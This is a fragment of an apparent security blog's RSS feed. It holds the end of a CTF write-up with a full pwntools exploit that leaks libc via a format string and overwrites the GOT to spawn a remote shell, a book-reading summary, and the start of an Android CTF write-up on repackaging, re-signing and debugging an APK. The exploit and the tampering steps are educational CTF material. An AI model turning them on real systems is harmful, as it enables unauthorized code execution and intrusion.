+   uid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dat_boinary&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; gid&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dat_boinary&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; groups&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;1000&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dat_boinary&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+   $ ls
+   dat_boinary
+   flag.txt
+   $ cat flag.txt
+   ctf&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0n1y_th3_fr35h35t_m3m3s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/usr/bin/env python&lt;/span&gt;
+
+&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; sys
+
+&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; pwn &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;
+
+system_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3e3e0&lt;/span&gt;
+libc_start_main_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x19970&lt;/span&gt;
+libc_leak_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; libc_start_main_addr &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;243&lt;/span&gt;
+system_offset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; system_addr &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc_leak_addr
+
+atoi_got &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8049128&lt;/span&gt;
+printf_plt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8048410&lt;/span&gt;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exploit&lt;/span&gt;(r):
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Set the id to something 8 chars long&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;please give your meme an id&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&amp;#34;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Run secret to overwrite the nullbyte&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;5&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;secret&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&amp;#34;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Update the id, but make sure that bytes 8-11 (dankness) are undex 0x80&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3nt3r ur m3m3 id&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x20\x00\x00\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p32(atoi_got))
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;send(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Z&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fread will read until it gets 21 bytes&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&amp;#34;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now we can write anything to that address&lt;/span&gt;
+    &lt;span style=&#34;color:#75715e&#34;&gt;# -- Write printf&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(p32(printf_plt))
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&amp;#34;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now in the menu we can enter format strings&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%23$X&amp;#34;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# The address of __libc_csu_init&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0pt10n.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;==&amp;gt; &amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;0pt10n.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;==&amp;gt; &amp;#34;&lt;/span&gt;)
+    leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recv(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;)
+    leak &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(leak, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&amp;#34;&lt;/span&gt;)
+    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Got leak 0x{:X}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(leak))
+    system_addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leak &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; system_offset
+
+    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;System shoud be at 0x{:X}&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;format(system_addr))
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Update meme (atoi_got) to point to system&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;33&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(p32(system_addr))
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;==&amp;gt;&amp;#34;&lt;/span&gt;)
+
+    &lt;span style=&#34;color:#75715e&#34;&gt;# Now call system with &amp;#34;/bin/sh&amp;#34;&lt;/span&gt;
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt;)
+    r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
+
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+    log&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;For remote: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; HOST PORT&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;])
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
+        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], int(sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]))
+        exploit(r)
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
+        r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./dat-boinary&amp;#39;&lt;/span&gt;], env&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;LD_PRELOAD&amp;#34;&lt;/span&gt;:&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./libc.so.6&amp;#34;&lt;/span&gt;})
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; util&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;proc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pidof(r)
+        pause()
+        exploit(r)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;flag: ctf(0n1y_th3_fr35h35t_m3m3s)&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-08-28-ctfx-dat-boinary/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>My Reading Summary - April-May 2016</title>
+        <link>https://grazfather.github.io/posts/2016-06-01-reading-april-may-2016/</link>
+        <pubDate>Wed, 01 Jun 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-06-01-reading-april-may-2016/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-06-01-reading-april-may-2016/ -&lt;p&gt;&lt;strong&gt;The Willpower Instinct&lt;/strong&gt; - I enjoyed this book a lot. I head of it while reviewing &lt;em&gt;The Power of Habit&lt;/em&gt;, a book I read a few months ago (and didn&amp;rsquo;t particularly love). This book does it a lot better. More interesting,  relevant facts (with citations), more actionable items, more engaging. While I felt that &lt;em&gt;The Power of Habit&lt;/em&gt; was there to break habits (such as smoking or overeating), this book was better geared for picking up and keeping positive habits. Since I care to make better habits more than I care to break bad ones (hoping I only have a few&amp;hellip;), I got a lot more out of this book.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Ready Player One&lt;/strong&gt; - Another book I really enjoyed. A fun story packed full of nostalgia-triggering references. While I sometimes felt that the author was too obviously pandering to his target audience, I was still hooked by the story. I crushed this book in only a few days.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Practical Reverse Engineering&lt;/strong&gt; - Pretty horrible. I was really looking forward to this book, and I bought it as soon as it was released. Unfortunately I was very disappointed. There&amp;rsquo;s a trend in tech books to put &amp;lsquo;the art of&amp;hellip;&amp;rsquo; or &amp;lsquo;practical&amp;hellip;&amp;rsquo; in the title, but never have I seen the word &amp;lsquo;practical&amp;rsquo; used so inappropriately. This book has a lot of information in it, but it&amp;rsquo;s not presented in a way that&amp;rsquo;s practical at all. &lt;em&gt;Practical Malware Analysis&lt;/em&gt;, a book I have been working through for over a year now is how you do this right: They provide samples to work through that progress in difficulty and included very good write-ups (which take up almost 40% of the pages). This book, on the other hand, throws in a ton of questions with no provided answers, nothing to set up (other than some binaries samples) and no real progression. The book was &lt;strong&gt;riddled&lt;/strong&gt; with mistakes (I found one per page for the first few pages) which really makes you hesitant to rely on it ever as a reference. The authors know what they&amp;rsquo;re talking about, they just don&amp;rsquo;t know how to write a useful book.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Meditations&lt;/strong&gt; - This is a oft-recommended book by many of the self-help people of today. It first came on my radar when I read the blog of Ryan Holiday, who wrote &lt;strong&gt;Trust Me, I&amp;rsquo;m Lying&lt;/strong&gt;, a book I enjoyed. While not some world-shattering book like some may have you believe, I enjoyed this a lot. It&amp;rsquo;s just a collection of entries Marcus Aurelius wrote to himself, with no intention of anyone else ever reading it. It&amp;rsquo;s eye opening to think of the power he wielded but the self discipline and set of morals he maintained to keep himself fro corrupting with power.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;iOS Application Security&lt;/strong&gt; - A very good but short intro to iOS security. I wish it spent more time from the perspective of someone without access to an app&amp;rsquo;s source code (since that&amp;rsquo;s what I do in my day-to-day), but I learned a lot. Very accessible and practical. Well recommended if you have any interest in undestanding how iOS security works, want to break some apps, or want to write them better.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Inner Game of Tennis&lt;/strong&gt; (Audiobook) - This book was recommended to me first by a professor in my undergrand &amp;ndash; I wish I remember who it was. It&amp;rsquo;s not necessarily about tennis, but more about how you approach, react to, and probably over think things. It touched more literally on tennis than I would have cared for, having never played a game in my life, but I do think I got something out of it, both in day-to-day professional and personal life as well as in any kind of physical activity. I noticed some parallels with this book and &lt;strong&gt;Thinking Fast and Slow&lt;/strong&gt;, though it seems this author didn&amp;rsquo;t have a technical term to describe what Kahneman would describe as the system 1 and system 2 mental states (which are of course just abstractions of an idea of roughly two different ways our brain operates). Gallwey (the author of this book) is in the camp that overthinking gets int he way of letting our body and mind do what it&amp;rsquo;s supposed to do: That is learn to mimic, build muscle memory, etc. It&amp;rsquo;s a short book and I think worth the read and some reflection.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Nineteen Eighty-Four&lt;/strong&gt; (Audiobook) - This one has been on my reading list for a long time, and since audiobooks aren&amp;rsquo;t very well suited to the technical books I tend to like to read, I thought I&amp;rsquo;d make a dent in my fiction backlog. I can&amp;rsquo;t say a lot here that hasn&amp;rsquo;t already been said. The ending is bleak, and despite the age of the book, had not been spoiled for me. The George Orwell goes off on a tangent when explaining Newspeak is and sort of beats you over the head with the moral of the story. I think that maybe this could have been done more subtly, but otherwise enjoyed it.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Sports Gene&lt;/strong&gt; - One of my other favorites this year. The Nature vs. Nurture debate goes on, and this book is a vote for the &amp;lsquo;nature&amp;rsquo; side. Though this isn&amp;rsquo;t strictly true: He acknowledges that yes, of course hours dedicated to training will help differentiate yourself some someone who hasn&amp;rsquo;t trained.&lt;/p&gt;
+&lt;p&gt;His point is that your genetic make up can give you a head start, a higher ceiling, let you get there more quickly, or any combination. He isn&amp;rsquo;t afraid so say things that some scientists have been afraid to publish for fear of being branded a racist. If your genetics can make you taller, faster, stronger, who is to say it can&amp;rsquo;t influence other aspects? Your temperament? your intelligence? The author sticks to sports related variations here, but I think he does a good job hinting the power of genes.&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;m not really a fan of Malcolm Gladwell or the other charlatans that peddle magic numbers or formulas for guaranteed success. I would like to think that I can become world class in anything I put 10&#39;000 hours to (who wouldn&amp;rsquo;t?) but 10&#39;000 hours as a metric is meaningless when you attach to it the condition that they be &amp;lsquo;deliberate practice&amp;rsquo; (what qualifies?). Add that some people may learn or adapt more quickly and I think the whole idea is bogus.&lt;/p&gt;
+&lt;p&gt;This book is some somewhat depressing evidence that even with 10&#39;000 hours of practice, I&amp;rsquo;ll never play in the NBA.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Brave New World&lt;/strong&gt; (Audiobook) - I guess I was on a future distopian tilt. I had read this in high school, but I don&amp;rsquo;t even remember if I finished it. It was interesting to listen to it immediately after 1984 since it made it easy to contrast the two fictional societies. In comparison, this one was a lot nicer than the one in 1984. The people here were more thoroughly brainwashed, done through dumbing down and making people happy. Sadly, I found the 1984 future more realistic.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;The Charisma Myth&lt;/strong&gt; - Kind of a waste of time, but I could say that I learned a thing or two. The book tries to teach the body language and tone that communicates stronger than words. By taking a certain approach appropriate to the audience and situation you can improve how people perceive you. This may be written for people who stare at their shoes, but I did find it had me more consciously making eye contact and did help a bit with a presentation I had to give.&lt;/p&gt;
+- https://grazfather.github.io/posts/2016-06-01-reading-april-may-2016/ - </description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Google CTF - Mobile 150 - Ill Intentions</title>
+        <link>https://grazfather.github.io/posts/2016-05-02-google-ctf-mobile-150-ill-intentions/</link>
+        <pubDate>Mon, 02 May 2016 12:00:00 +0000</pubDate>
+        
+        <guid>https://grazfather.github.io/posts/2016-05-02-google-ctf-mobile-150-ill-intentions/</guid>
+        <description>Grazfather https://grazfather.github.io/posts/2016-05-02-google-ctf-mobile-150-ill-intentions/ -&lt;p&gt;The timing for this challenge was just about perfect for me. A new colleague of mine just last week did a presentation on smali basics and debugging Android Applications using IDA. Before that I had only done some of the most basic patches in smali and no real dynamic stuff other than with &lt;code&gt;am&lt;/code&gt; or purpose-built apps.&lt;/p&gt;
+&lt;p&gt;My process for an APK is pretty simple: Unzip, &lt;code&gt;dex2jar&lt;/code&gt;, and &lt;code&gt;apktool -d&lt;/code&gt;. This yields a &lt;em&gt;.jar&lt;/em&gt; file you can look at with JD-GUI and the smali code if you need to make changes. It also converts the &lt;em&gt;AndroidManifest.xml&lt;/em&gt; back into a readable format.&lt;/p&gt;
+&lt;p&gt;Peeking at the manifest, we see that it defines two permissions, _ctf.permission.&lt;em&gt;MSG&lt;/em&gt;, which has the level &amp;lsquo;signature&amp;rsquo;, and _ctf.permission.&lt;em&gt;SEND&lt;/em&gt;. There are also a few activities defined: &lt;em&gt;com.example.application.IsThisTheRealOne&lt;/em&gt;, &lt;em&gt;&amp;hellip;ThisIsTheRealOne&lt;/em&gt;, and &lt;em&gt;&amp;hellip;DefinitelyNotThisOne&lt;/em&gt;. Finally, it defines a receiver &lt;em&gt;com.example.application.Send_to_Activity&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Popping the jar into JD-GUI, we first peek at the &lt;em&gt;MainActivity&lt;/em&gt;. Super simple: Nothing on the UI but some text, and the &lt;em&gt;Send_to_Activity&lt;/em&gt; receiver is registered, filtering on &lt;em&gt;com.ctf.INCOMING_INTENT&lt;/em&gt;, and requiring the first custom &amp;lsquo;MSG&amp;rsquo; permission.&lt;/p&gt;
+&lt;p&gt;In &lt;em&gt;Send_to_Activity&lt;/em&gt;&amp;rsquo;s &lt;code&gt;onReceive&lt;/code&gt; message we see that it checks the received intent for a string extra named &amp;ldquo;msg&amp;rdquo;, and uses it to select which activity to send an intent to.&lt;/p&gt;
+&lt;p&gt;It&amp;rsquo;s in the three activities that are sent to that where things get interesting. All three look about the same, with small variations: Get some string, munge it up (using some native functions &lt;code&gt;computeFlag&lt;/code&gt; and &lt;code&gt;definitelyNotThis&lt;/code&gt; from &lt;em&gt;libhello-jni.so&lt;/em&gt;), and then send a broadcast intent with the result. Because it doesn&amp;rsquo;t take any input from us, we can assume that one of these must generate the flag, and it&amp;rsquo;s only a matter of &amp;lsquo;catching&amp;rsquo; the output.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-05-02-Google-CTF-Mobile-150-Ill-Intentions-code.png&#34; alt=&#34;onClick method&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s play around to make sure we have the correct understanding of what&amp;rsquo;s going on. Installing the apk on my phone, I opened each of the activities using &lt;code&gt;am&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;shell@A0001:/ $ su
+root@A0001:/ &lt;span style=&#34;color:#75715e&#34;&gt;# am start -n com.example.hellojni/com.example.application.MainActivity&lt;/span&gt;
+Starting: Intent &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; cmp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com.example.hellojni/com.example.application.MainActivity &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+root@A0001:/ &lt;span style=&#34;color:#75715e&#34;&gt;# am start -n com.example.hellojni/com.example.application.IsThisTheRealOne&lt;/span&gt;
+Starting: Intent &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; cmp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com.example.hellojni/com.example.application.IsThisTheRealOne &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+root@A0001:/ &lt;span style=&#34;color:#75715e&#34;&gt;# am start -n com.example.hellojni/com.example.application.ThisIsTheRealOne&lt;/span&gt;
+Starting: Intent &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; cmp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com.example.hellojni/com.example.application.ThisIsTheRealOne &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+root@A0001:/ &lt;span style=&#34;color:#75715e&#34;&gt;# am start -n com.example.hellojni/com.example.application.DefinitelyNotThisOne&lt;/span&gt;
+Starting: Intent &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; cmp&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com.example.hellojni/com.example.application.DefinitelyNotThisOne &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Although it took longer than I&amp;rsquo;d like to admit to get the syntax correct in &lt;code&gt;am&lt;/code&gt;, once I had the above commands, I could switch between the activites with ease. The last three activities render on screen with nothing but a big button. Tappind the button executes the code that computes and broadcasts the flag. Note that we never had to use &lt;em&gt;Send_to_Activity&lt;/em&gt;. We &lt;em&gt;could&lt;/em&gt; have used it just the same:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@A0001:/ &lt;span style=&#34;color:#75715e&#34;&gt;# am broadcast -a com.ctf.INCOMING_INTENT --es msg &amp;#34;IsThisTheRealOne&amp;#34;&lt;/span&gt;
+Broadcasting: Intent &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; act&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com.ctf.INCOMING_INTENT &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;has extras&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+Broadcast completed: result&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;p&gt;Now that we know how to control the app and have a pretty good idea of how the flag is generated, there are a few ways to approach this:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;We can write an app that has a receiver that filters on &lt;em&gt;com.ctf.OUTGOING_INTENT&lt;/em&gt; and logs what it receives.&lt;/li&gt;
+&lt;li&gt;We can debug the app and just set a breakpoint on each call to &lt;code&gt;putExtra&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Because I don&amp;rsquo;t feel like writing java (I never do), I&amp;rsquo;ll go with the latter. The former requires signing the new app with the same key (because of the &amp;lsquo;signature&amp;rsquo; level on the permission), but we could get around that by simply re-signing the original app with our own key. The latter requires we change the &lt;em&gt;AndroidManifest.xml&lt;/em&gt; to set &lt;code&gt;debuggable&lt;/code&gt; to true. This also requires re-signing the app (so we can reinstall it) but that&amp;rsquo;s trivial.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Edit &lt;em&gt;AndroidManifest.xml&lt;/em&gt;: &lt;code&gt;&amp;lt;application android:icon=&amp;quot;@mipmap/ic_launcher&amp;quot; android:label=&amp;quot;CTF Application&amp;quot; android:debuggable=&amp;quot;true&amp;quot;&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Build a new apk: &lt;code&gt;apktool b&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Create some bogus key: &lt;code&gt;keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Sign the apk: &lt;code&gt;jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ./my-release-key.keystore illintentions.apk alias_name&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Uninstall the old app (from the UI).&lt;/li&gt;
+&lt;li&gt;Install the new one: &lt;code&gt;adb install illintentions.apk&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Now I load up the APK in IDA, navigate to the &lt;code&gt;onClick&lt;/code&gt; methods in each activity, set a breakpoint, follow the instructions &lt;a href=&#34;https://www.hex-rays.com/products/ida/support/tutorials/debugging_dalvik.pdf&#34;&gt;here&lt;/a&gt;, and start the application in the debugger.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://grazfather.github.io/assets/2016-05-02-Google-CTF-Mobile-150-Ill-Intentions-bp.png&#34; alt=&#34;Breakpoint&#34;&gt;&lt;/p&gt;
